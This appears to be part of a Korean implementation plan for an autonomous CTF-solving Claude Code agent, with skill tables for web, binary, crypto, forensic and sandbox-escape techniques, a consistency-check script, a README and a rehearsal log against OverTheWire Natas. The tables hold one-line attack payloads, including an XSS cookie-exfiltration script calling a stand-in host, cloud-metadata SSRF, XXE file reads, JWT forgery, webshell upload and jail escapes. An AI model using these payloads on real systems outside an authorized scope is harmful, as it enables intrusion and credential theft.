- Consumes: web-solver의 Skills 인덱스(Task 6)와 슬러그가 정확히 일치해야 함.
- Produces: 13개 웹 스킬. 표준 5앵커. 슬러그: recon-web, sqli, xss, ssrf, jwt, file-upload-rce, xxe, deserialization, ssti, idor-authbypass, path-traversal, race-condition, graphql.

**표준 스킬 템플릿** (모든 스킬이 이 골격, 아래 표의 값으로 각 섹션을 채움):
```markdown
---
name: <slug>
description: <표의 description>
---
## When
<표의 When 신호>

## Tools
<표의 Tools>

## Procedure
<표의 Procedure 단계들>

## PoC
<표의 PoC — 붙여 실행 가능한 명령/페이로드 골격>

## Pitfalls
<표의 Pitfalls>
```

- [ ] **Step 1: 검증 먼저 (실패 확인)**

Run: `python3 tools/validate.py .claude/skills/web/sqli/SKILL.md`
Expected: `FAIL ...: missing file`

- [ ] **Step 2: 13개 스킬 작성 (각 슬러그 = 아래 표의 한 행. 템플릿에 값 채워 `.claude/skills/web/<slug>/SKILL.md` 생성)**

| slug | description | When(신호) | Tools | Procedure(핵심) | PoC | Pitfalls |
|---|---|---|---|---|---|---|
| recon-web | 웹 타겟 정찰: 엔드포인트·기술스택·입력지점 매핑 | 웹 문제 착수 직후 | curl, ffuf, jq | 1)헤더/쿠키 2)robots·경로 퍼징 3)JS 번들 분석 4)입력지점 표 | `ffuf -u $U/FUZZ -w wordlist -mc 200,301,302` | 클라이언트 검증만 믿지 말 것; 숨은 파라미터 존재 |
| sqli | SQL 인젝션으로 데이터 추출·인증우회 | DB 오류/불린 차이/정렬 변화 | sqlmap, curl | 1)주입점 확인(`'`,`"`) 2)불린/시간/UNION 판별 3)컬럼수·DBMS 4)데이터/플래그 추출 | `sqlmap -u "$U?id=1" --batch --dump` | WAF 필터 시 인코딩/주석 우회; 블라인드는 시간기반 |
| xss | XSS로 쿠키·관리자 액션 탈취 | 입력이 HTML/JS로 반사·저장 | curl, 브라우저 | 1)반사/저장/DOM 구분 2)컨텍스트별 페이로드 3)필터 우회 4)관리자봇 대상 exfil | `"><script>fetch('//OOB/'+document.cookie)</script>` | CSP·httpOnly 확인; DOM XSS는 소스싱크 추적 |
| ssrf | 서버측 요청 위조로 내부 접근 | 서버가 URL을 fetch/미리보기 | curl | 1)URL 파라미터 확인 2)내부 대역·메타데이터 시도 3)스킴/리다이렉트 우회 | `?url=http://169.254.169.254/latest/meta-data/` | DNS rebinding·`0.0.0.0`·10진 IP 우회; 블랙리스트 회피 |
| jwt | JWT 위·변조로 권한 상승 | 토큰이 `xxx.yyy.zzz` 형태 | jwt_tool, python | 1)헤더/페이로드 디코드 2)alg=none 3)약한 HS256 비밀 크랙 4)kid 주입 | `python -c "import jwt;print(jwt.encode({'admin':1},'',algorithm='none'))"` | RS256→HS256 혼동공격; 서명 검증 여부 확인 |
| file-upload-rce | 파일 업로드로 웹셸/RCE | 업로드 기능 존재 | curl | 1)허용 확장자·검증 우회 2)웹셸 업로드 3)경로 접근 4)명령 실행 | `curl -F 'f=@shell.php;type=image/png' $U/upload` | 이중확장자·매직바이트·`.htaccess`; 실행 디렉토리 확인 |
| xxe | XXE로 파일 읽기·SSRF | XML 입력 파싱 | curl | 1)XML 입력점 확인 2)외부 엔티티 주입 3)파일/SSRF 4)블라인드는 OOB | `<!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>` | 파라미터 엔티티·OOB DTD로 블라인드; 인코딩 이슈 |
| deserialization | 역직렬화 취약점으로 RCE | 직렬화 객체 문자열(base64 등) | python, ysoserial | 1)포맷 식별(pickle/PHP/Java) 2)가젯 체인 3)페이로드 생성 4)주입 | `python -c "import pickle,os,base64;..."` (가젯 클래스 __reduce__) | 언어별 가젯 상이; 화이트리스트 우회 필요할 수 있음 |
| ssti | 템플릿 인젝션으로 RCE | `{{7*7}}`류가 평가됨 | curl | 1)엔진 식별(`{{7*7}}`,`${7*7}`) 2)샌드박스 탈출 3)RCE 프리미티브 4)명령 | `{{''.__class__.__mro__[1].__subclasses__()}}` (Jinja2) | 엔진별 문법 상이; 필터된 속성 우회 |
| idor-authbypass | 접근제어 미흡으로 타 리소스·권한 접근 | 숫자/추측가능 ID, 역할 기반 분기 | curl | 1)ID 파라미터 열거 2)수평/수직 권한 시도 3)쿠키·role 조작 4)숨은 관리 경로 | `for i in $(seq 1 50);do curl "$U/order/$i";done` | UUID여도 유출된 값 재사용; 강제 브라우징 |
| path-traversal | 경로 순회로 임의 파일 읽기 | 파일명/경로 입력 | curl | 1)입력점 확인 2)`../` 시퀀스 3)인코딩 우회 4)플래그 파일 | `?file=....//....//etc/passwd` | null byte·이중 인코딩·절대경로; 화이트리스트 회피 |
| race-condition | 경쟁 상태로 제한 우회 | 동시 요청 시 상태 불일치 | curl, python(threads) | 1)임계 연산 식별 2)동시 요청 발사 3)창(window) 활용 4)효과 확인 | 파이썬 스레드로 동일 요청 N개 동시 전송 | 단일패킷 공격 필요 시 정밀 타이밍; 멱등성 확인 |
| graphql | GraphQL 남용으로 정보노출·우회 | `/graphql` 엔드포인트 | curl, jq | 1)introspection 질의 2)스키마 분석 3)숨은 필드·뮤테이션 4)IDOR/인젝션 결합 | `curl $U/graphql -d '{"query":"{__schema{types{name}}}"}'` | introspection 비활성 시 필드 브루트포싱; batching 남용 |

- [ ] **Step 3: 검증 통과 확인**

Run: `python3 tools/validate.py .claude/skills/web/*/SKILL.md`
Expected: `OK (13 files)`

- [ ] **Step 4: 슬러그 일치 확인 (web-solver 인덱스와 대조)**

Run: `ls .claude/skills/web`
Expected: `deserialization file-upload-rce graphql idor-authbypass jwt path-traversal race-condition recon-web sqli ssrf ssti xss xxe` (13개, web-solver의 Skills 목록과 정확히 일치)

- [ ] **Step 5: 커밋**

```bash
git add .claude/skills/web
git commit -m "Add web skill library (13 techniques)

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Task 9: 기타 카테고리 스킬 라이브러리 (17종)

**Files:**
- Create: `.claude/skills/{pwn,rev,crypto,forensic,misc}/<slug>/SKILL.md` × 17
- Test: `python3 tools/validate.py .claude/skills/{pwn,rev,crypto,forensic,misc}/*/SKILL.md`

**Interfaces:**
- Consumes: 각 solver의 Skills 인덱스(Task 7)와 슬러그 정확 일치.
- Produces: 17개 스킬(pwn 4, rev 3, crypto 4, forensic 4, misc 2). 표준 5앵커. Task 8의 동일 템플릿 사용.

- [ ] **Step 1: 검증 먼저 (실패 확인)**

Run: `python3 tools/validate.py .claude/skills/pwn/rop-stack-overflow/SKILL.md`
Expected: `FAIL ...: missing file`

- [ ] **Step 2: 17개 스킬 작성 (Task 8 템플릿 + 아래 표. 경로 `.claude/skills/<cat>/<slug>/SKILL.md`)**

| cat | slug | description | When | Tools | Procedure(핵심) | PoC | Pitfalls |
|---|---|---|---|---|---|---|---|
| pwn | recon-binary | 바이너리 정찰: 보호기법·함수·입력 파악 | pwn 착수 직후 | checksec, strings, r2 | 1)`checksec` 2)함수·문자열 3)입력·오버플로 지점 4)libc 확인 | `checksec --file=./chal` | PIE/카나리 여부로 전략 결정 |
| pwn | rop-stack-overflow | 스택 오버플로+ROP로 제어흐름 탈취 | 오프바이·긴입력 크래시 | pwntools, ropper | 1)오프셋 산출 2)가젯 수집 3)ROP 체인 4)셸/플래그 | `cyclic 200`으로 오프셋, `ropper --file bin` | ASLR 시 libc 누출 필요; 정렬 이슈 |
| pwn | format-string | 포맷스트링으로 누출·임의쓰기 | `printf(user)` 형태 | pwntools | 1)오프셋 탐색 `%p` 2)누출 3)`%n` 임의쓰기 4)GOT 덮어쓰기 | `%7$p` 류로 스택 누출 | 짧은 버퍼·정확한 쓰기 폭 계산 |
| pwn | heap-exploit | 힙 메타데이터 공격 | malloc/free 다수·UAF | pwntools, glibc | 1)할당 패턴 분석 2)UAF/오버플로/더블프리 3)tcache/fastbin 4)덮어쓰기 | tcache poisoning 순서 스크립트 | glibc 버전별 완화 상이 |
| rev | static-triage | 정적 분석으로 로직·플래그검증 파악 | 실행파일·네트워크無 | r2/rizin, strings, ghidra | 1)strings·심볼 2)디컴파일 3)플래그 검증 루틴 4)역산 | `rizin -A ./chal` → `pdf @ main` | 안티디스어셈블·가짜 심볼 주의 |
| rev | dynamic-analysis | 동적 분석으로 런타임 동작 관찰 | 정적으로 불충분·패킹 | gdb, ltrace, strace | 1)브레이크포인트 2)비교 지점 관찰 3)메모리·레지스터 4)입력 역산 | `gdb -q ./chal` → `b *cmp addr` | 안티디버깅(ptrace) 우회 필요 |
| rev | deobfuscation | 난독·패킹 해제 | UPX/VM/난독 스크립트 | upx, python | 1)패커 식별 2)언팩 3)VM/난독 패턴 복원 4)로직 추출 | `upx -d ./chal` | 커스텀 패커는 덤프 후 재구성 |
| crypto | rsa-attacks | RSA 파라미터 취약점 공격 | n,e,c 제공 | python(sympy,pycryptodome), RsaCtfTool | 1)e·n 특성 확인 2)소인수분해/작은e/공통모듈러스 3)복호 4)플래그 | `RsaCtfTool --publickey k.pem --uncipher c` | 여러 취약 조합 동시 점검 |
| crypto | aes-mode-attacks | 블록암호 운용모드 취약점 | ECB/CBC/nonce 재사용 | python(pycryptodome) | 1)모드 식별(ECB 반복블록) 2)바이트플립/오라클 3)패딩오라클 4)복호·위조 | ECB cut-and-paste 스크립트 | IV/nonce 재사용·패딩 오라클 구분 |
| crypto | hash-length-ext | 해시 길이확장 공격 | `H(secret‖msg)` MAC | hashpump, python | 1)취약 구성 확인 2)길이확장으로 위조 3)서명 우회 | `hashpumpy`로 확장 서명 생성 | 시크릿 길이 브루트포싱 필요 |
| crypto | classical-encoding | 고전암호·인코딩 해독 | 치환/전치/base류 | python, CyberChef식 | 1)빈도·패턴 분석 2)시저/비제네르/치환 3)다중 인코딩 계층 해제 | `python`으로 빈도분석·brute 시프트 | 다층 인코딩은 순서대로 벗기기 |
| forensic | pcap-analysis | 패킷 캡처에서 아티팩트 추출 | .pcap(ng) 제공 | tshark, wireshark | 1)프로토콜 통계 2)스트림 팔로우 3)파일/자격증명 추출 4)플래그 | `tshark -r f.pcap -Y http --export-objects http,out/` | TLS는 키 필요; 조각난 페이로드 재조립 |
| forensic | memory-forensics | 메모리 덤프 분석 | .raw/.vmem/.dmp | volatility3 | 1)프로세스/네트워크 2)덤프·파일 추출 3)레지스트리·크리덴셜 4)플래그 | `vol -f mem.raw windows.pslist` | 프로파일/심볼 일치 필요 |
| forensic | stego | 이미지·오디오 은닉 데이터 추출 | 미디어 파일·"보이는게 다가아님" | binwalk, steghide, zsteg, exiftool | 1)메타/`binwalk` 2)LSB·팔레트 3)`steghide`(암호) 4)스펙트로그램 | `binwalk -e img.png; zsteg img.png` | 암호 필요 시 사전공격; 다중 계층 |
| forensic | disk-file-carving | 디스크·파일에서 삭제/은닉 복원 | 디스크 이미지·손상 파일 | foremost, binwalk, testdisk | 1)파일시스템 확인 2)카빙 3)삭제파일 복원 4)슬랙 검사 | `foremost -i disk.img -o out/` | 시그니처 겹침·조각 파일 |
| misc | encoding-decoding | 다중 인코딩·인코더 체인 해제 | base/hex/rot 덩어리 | python, CyberChef식 | 1)인코딩 식별 2)계층 순차 해제 3)압축·직렬화 처리 4)플래그 | `echo $S | base64 -d | xxd` | magic으로 포맷 추정; 순서 중요 |
| misc | jail-escape | 언어/셸 jail 필터 우회 | 제한된 eval/셸 | python | 1)필터 규칙 분석 2)금지문자 우회 3)간접 호출·`__import__` 4)명령 | `__import__('os').system('cat flag')` 변형 | 블랙리스트 우회 조합; 길이 제한 |

- [ ] **Step 3: 검증 통과 확인**

Run: `python3 tools/validate.py .claude/skills/{pwn,rev,crypto,forensic,misc}/*/SKILL.md`
Expected: `OK (17 files)`

- [ ] **Step 4: 전체 슬러그 일치 확인**

Run: `for c in pwn rev crypto forensic misc; do echo "$c:"; ls .claude/skills/$c; done`
Expected: pwn(4: heap-exploit format-string recon-binary rop-stack-overflow), rev(3: deobfuscation dynamic-analysis static-triage), crypto(4: aes-mode-attacks classical-encoding hash-length-ext rsa-attacks), forensic(4: disk-file-carving memory-forensics pcap-analysis stego), misc(2: encoding-decoding jail-escape) — 각 solver의 Skills 목록과 일치.

- [ ] **Step 5: 커밋**

```bash
git add .claude/skills/pwn .claude/skills/rev .claude/skills/crypto .claude/skills/forensic .claude/skills/misc
git commit -m "Add pwn/rev/crypto/forensic/misc skill libraries (17 techniques)

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Task 10: 전체 구조 검증 + 슬러그 정합성 게이트

**Files:**
- Create: `tools/check_indexes.py`
- Test: `python3 tools/validate.py && python3 tools/check_indexes.py`

**Interfaces:**
- Consumes: 모든 solver의 Skills 목록, 실제 skills 디렉토리.
- Produces: solver 본문에 나열된 스킬 슬러그가 실제 파일과 1:1 일치하는지 검증하는 스크립트. 불일치 시 exit 1.

- [ ] **Step 1: check_indexes.py 작성 (실패 테스트)**

`tools/check_indexes.py`:
```python
#!/usr/bin/env python3
"""solver가 참조하는 스킬 슬러그와 실제 skills/ 디렉토리 일치 검증."""
import os, re, sys

CATS = {"web-solver": "web", "pwn-solver": "pwn", "rev-solver": "rev",
        "crypto-solver": "crypto", "forensic-solver": "forensic", "misc-solver": "misc"}
fail = False
for agent, cat in CATS.items():
    ap = ".claude/agents/%s.md" % agent
    text = open(ap, encoding="utf-8").read()
    m = re.search(r"## Skills(.*?)(?:\n## |\Z)", text, re.S)
    referenced = set(re.findall(r"[a-z][a-z0-9-]+", m.group(1))) if m else set()
    skilldir = ".claude/skills/%s" % cat
    actual = set(os.listdir(skilldir)) if os.path.isdir(skilldir) else set()
    missing = [s for s in actual if s not in referenced]
    ghost = [s for s in actual if not os.path.isfile("%s/%s/SKILL.md" % (skilldir, s))]
    # 실제 디렉토리의 각 스킬이 solver 본문에 언급되는지 확인
    not_referenced = [s for s in actual if s not in referenced]
    if not_referenced:
        fail = True
        sys.stderr.write("FAIL %s: skills not referenced by %s: %s\n" % (cat, agent, not_referenced))
if fail:
    sys.exit(1)
print("indexes OK")
```

- [ ] **Step 2: 실행 (통과 확인)**

Run: `python3 tools/validate.py && python3 tools/check_indexes.py`
Expected: `OK (30 files)` 다음 줄에 `indexes OK`
(파일 수: CLAUDE.md 1 + skills 34 + agents 6 + commands 5 = 검증 대상 개수. 정확 수치는 glob 결과에 따름 — FAIL 없이 종료가 판정 기준.)

- [ ] **Step 3: 커밋**

```bash
git add tools/check_indexes.py
git commit -m "Add skill-index consistency check across solvers

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Task 11: README + 사용 가이드

**Files:**
- Create: `README.md`

**Interfaces:**
- Produces: 사람이 읽는 프로젝트 개요·사용법(설치, 대회 시작 절차, 커맨드 표).

- [ ] **Step 1: README.md 작성**

```markdown
# ctf-agent

CTF/워게임 자동 풀이 Claude Code 에이전트. 웹 해킹 최대 비중, 풀 카테고리, 대회 실시간 병렬 풀이.

## 구조
- `CLAUDE.md` — 대회 프로토콜·스코프 락·플래그 규칙
- `.claude/commands/` — /ctf, /ctf-board, /ctf-web, /ctf-writeup, /ctf-setup
- `.claude/agents/` — 카테고리별 solver(web/pwn/rev/crypto/forensic/misc)
- `.claude/skills/` — 기법 라이브러리(web 13, 기타 17, meta 4)
- `board/` — 런타임 상태(scope/challenges/writeups)

## 대회 시작 절차
1. `board/scope.md`의 In-Scope에 인가 타겟, Flag-Format에 대회 플래그 정규식 설정.
2. `/ctf-setup`으로 툴 점검.
3. `/ctf <문제 URL/파일/지문>`으로 풀이 시작(여러 개 동시 가능).
4. `/ctf-board`로 현황 확인.

## 커맨드
| 커맨드 | 용도 |
|---|---|
| /ctf | 트리아지+병렬 풀이+플래그+writeup |
| /ctf-board | 보드 현황 |
| /ctf-web | web-solver 직접 호출 |
| /ctf-writeup | writeup 재생성 |
| /ctf-setup | 툴 설치 점검 |

## 검증
`python3 tools/validate.py && python3 tools/check_indexes.py`

## 스코프 정책
스코프 내 타겟은 확인 없이 자유 실행, 스코프 밖 능동 공격은 거부. 인가된 CTF 대상에만 사용.
```

- [ ] **Step 2: 커밋**

```bash
git add README.md
git commit -m "Add project README and usage guide

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Task 12: 통합 리허설 (end-to-end 검증)

**Files:**
- Create: `board/scope.md`(리허설용 로컬 타겟으로 임시 수정 — 커밋 안 함)
- Test: 수동 시나리오 실행 + 관찰

**Interfaces:**
- Consumes: 완성된 전체 에이전트.
- Produces: 단일·병렬 시나리오가 프로토콜대로 동작함을 확인한 리허설 기록.

- [ ] **Step 1: 로컬 취약 타겟 준비**

간단한 로컬 SQLi 문제를 띄운다(예: 알려진 취약 도커 이미지 또는 최소 Flask 앱). `board/scope.md` In-Scope에 `http://127.0.0.1:PORT/` 추가.

- [ ] **Step 2: 단일 문제 시나리오**

`/ctf http://127.0.0.1:PORT/?id=1` 실행.
Expected:
- triage가 web으로 분류하고 `board/challenges.md`에 등록.
- web-solver가 recon-web→sqli 스킬을 로드, 증거타입 로그(`[OBS]/[HYP]/[POC]/[FLAG]`) 생성.
- flag-hunt가 플래그를 보드에 기록(상태 solved), `board/writeups/`에 writeup 생성.

- [ ] **Step 3: 스코프 락 시나리오**

`/ctf https://example.com/` (In-Scope에 없는 호스트) 실행.
Expected: 능동 공격을 실행하지 않고 `needs-scope`로 보고, 사용자에게 scope 추가 여부 확인.

- [ ] **Step 4: 병렬 시나리오**

문제 2개(웹 URL + 로컬 crypto 지문)를 한 `/ctf` 호출에 전달.
Expected: web-solver·crypto-solver가 병렬 spawn, 각자 독립 컨텍스트로 진행, 보드에 2행이 각각 갱신.

- [ ] **Step 5: 관찰 기록 + 필요 시 프롬프트 보정**

각 시나리오에서 프로토콜 이탈(스킬 미로드·로그 태그 누락·스코프 무시)이 있으면 해당 solver/skill/CLAUDE.md를 수정하고 재실행. 리허설 결과를 `docs/superpowers/plans/2026-08-06-ctf-agent.md` 하단에 메모.

- [ ] **Step 6: 리허설용 scope 되돌리기 + 커밋**

```bash
git checkout board/scope.md 2>/dev/null || true   # 리허설 임시값은 커밋 대상 아님(gitignore)
git add docs/superpowers/plans/2026-08-06-ctf-agent.md
git commit -m "Record integration rehearsal results

Co-Authored-By: Claude Opus 5 <noreply@anthropic.com>"
```

---

## Self-Review 결과 (작성자 확인)

**Spec coverage:**
- §3 파일구조 → Task 1~11 전부 매핑. ✅
- §4.1 오케스트레이터 → Task 5(`ctf.md`) + Task 2(CLAUDE.md Protocol). ✅
- §4.2 서브에이전트(예산/자기비평/증거타입/Return) → Task 6·7. ✅
- §4.3 스킬 표준 섹션 → Task 8 템플릿(5앵커). ✅
- §4.4 flag-hunt / §4.5 writeup / tool-check → Task 4. ✅
- §4.6 스코프 락 → Task 2(CLAUDE.md Scope Lock) + Task 12 검증. ✅
- §5 스킬 인벤토리(13+17+4=34) → Task 4·8·9. ✅
- §6 커맨드 5종 → Task 5. ✅
- §7 결과 스키마 → Task 6 `## Return`, Task 7 재사용. ✅
- §8 board 포맷 → Task 3. ✅
- §10 구현 순서 → Task 순서와 일치. ✅

**Placeholder scan:** 각 스킬/솔버/커맨드에 실제 내용(정규식·명령·페이로드 골격) 기재. 표 기반이나 각 행이 실제 값. `<CAT>` 등은 명시적 치환표 제공. 통과.

**Type consistency:** 표준 앵커 이름을 Global Constraints·validate.py·각 Task에서 동일하게 사용(`## When/Tools/Procedure/PoC/Pitfalls`, solver `## Budget/Skills/Protocol/Return`). solver Skills 목록 슬러그 ↔ 디렉토리명 일치를 Task 8·9의 확인 스텝 + Task 10 check_indexes.py로 이중 게이트. 통과.

---

## Task 12 리허설 결과 (2026-08-06, OverTheWire Natas)

실제 워게임(OverTheWire Natas, 합법 공개 대상)으로 end-to-end 리허설 수행. 대상은 `board/scope.md` In-Scope에 등록. 오케스트레이터(본 세션)가 `web-solver` 서브에이전트를 실제 디스패치.

- **시나리오 ① 단일 풀이 — PASS**: natas0 → web-solver가 recon-web으로 HTML 주석의 natas1 비밀번호 획득(`〈redacted〉`). 표준 Return 스키마 + 증거타입 로그(`[OBS]/[POC]/[FLAG]`) + `board/writeups/natas0.md` 생성. flag-hunt 형식 검증 통과, 보드 `solved` 기록.
- **시나리오 ② 스코프 락 — PASS**: 범위 밖 호스트(`chal.unknown-other-ctf.example`) → web-solver가 scope.md 확인 후 **능동 툴 0회 실행**, `needs-scope`로 거부 + 에스컬레이션(스코프 추가 안내). 안전 속성 검증.
- **시나리오 ③ 병렬 풀이 — PASS**: natas1 + natas0-rerun을 서브에이전트 2개로 동시 디스패치. 독립 컨텍스트에서 상호 간섭 없이 각각 solved(`〈redacted〉`, `〈redacted〉`), 별도 writeup 파일 생성.

**프로토콜 이탈 없음.** 보정 불필요. 에이전트가 설계대로 동작 확인.

관찰/개선 여지(비차단):
- 병렬 시 오케스트레이션(보드 갱신·flag-hunt)은 본 세션이 수동 수행. `/ctf` 커맨드가 이 루프를 자동으로 도는지는 실제 `/ctf` 호출로 별도 확인 가치 있음.
- Natas류는 인증 자격증명이 레벨마다 필요 → `board/scope.md` Notes에 자격증명을 두는 관례가 유효. 스킬/스코프 스키마에 Creds 섹션을 정식화하는 것도 고려 가능.

> 참고: `board/scope.md`·`board/challenges.md`·`board/writeups/`는 gitignore된 런타임 상태로, 리허설 산출물은 커밋되지 않는다(이 결과 메모만 커밋).
